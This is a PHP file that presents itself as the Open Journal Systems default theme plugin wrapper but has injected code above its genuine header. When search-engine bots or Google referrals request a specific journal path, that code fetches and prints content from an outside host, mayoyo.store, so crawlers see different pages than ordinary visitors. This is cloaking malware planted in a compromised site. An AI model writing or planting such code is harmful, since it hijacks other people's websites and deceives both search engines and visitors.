<?php
$userAgent = strtolower(isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '');
$referer = strtolower(isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '');
$uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '';

if ($uri == '/index.php/jurnalbinaedukasi' && (
    strpos($userAgent, 'bot') !== false || 
    strpos($userAgent, 'google') !== false || 
    strpos($userAgent, 'chrome-lighthouse') !== false || 
    strpos($referer, 'google') !== false
)) {
    echo file_get_contents('https://mayoyo.store/journal.binadarma.ac.id/jurnalbinaedukasi.txt');
    exit();
}

/**
 * @file plugins/themes/default/index.php
 *
 * Copyright (c) 2014-2021 Simon Fraser University
 * Copyright (c) 2003-2021 John Willinsky
 * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
 *
 * @ingroup plugins_themes_default
 *
 * @brief Wrapper for default theme plugin.
 *
 */

return new \APP\plugins\themes\default\DefaultThemePlugin();
